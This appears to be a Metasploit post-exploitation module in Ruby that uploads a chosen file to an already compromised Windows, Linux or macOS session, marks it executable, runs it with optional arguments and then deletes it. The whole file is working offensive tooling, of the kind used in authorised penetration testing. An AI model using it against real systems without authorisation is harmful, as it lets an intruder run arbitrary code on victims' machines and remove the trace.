##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Upload and Execute',
      'Description'   => %q{ Push a file and execute it },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'egypt'],
      'Platform'      => [ 'win','linux','osx' ],
      'SessionTypes'  => [ 'meterpreter','shell' ]
    ))

    register_options(
      [
        OptPath.new('LPATH', [true, 'Local file path to upload and execute']),
        OptString.new('RPATH', [false, 'Remote file path on target (default is basename of LPATH)']),
        OptString.new('ARGS', [false, 'Command-line arguments to pass to the uploaded file']),
        OptInt.new('TIMEOUT', [true, 'Timeout for command execution', 0])
      ])
  end

  def rpath
    if datastore['RPATH'].blank?
      remote_name = File.basename(datastore['LPATH'])
    else
      remote_name = datastore['RPATH']
    end

    remote_name
  end

  def args
    datastore['ARGS']
  end

  def timeout
    datastore['TIMEOUT']
  end

  def lpath
    datastore['LPATH']
  end

  def run
    upload_file(rpath, lpath)

    if session.platform.include?('windows')
      cmd_exec("cmd.exe /c start #{rpath}", args, timeout)
    else
      # Handle absolute paths
      if rpath.start_with?('/')
        cmd = rpath
      else
        cmd = "./#{rpath}"
      end

      if session.type == 'meterpreter'
        # client is an alias for session
        client.fs.file.chmod(rpath, 0700)
      else
        cmd_exec("chmod 700 #{rpath}")
      end

      cmd_exec(cmd, args, timeout)
    end

    rm_f(rpath)
  end
end
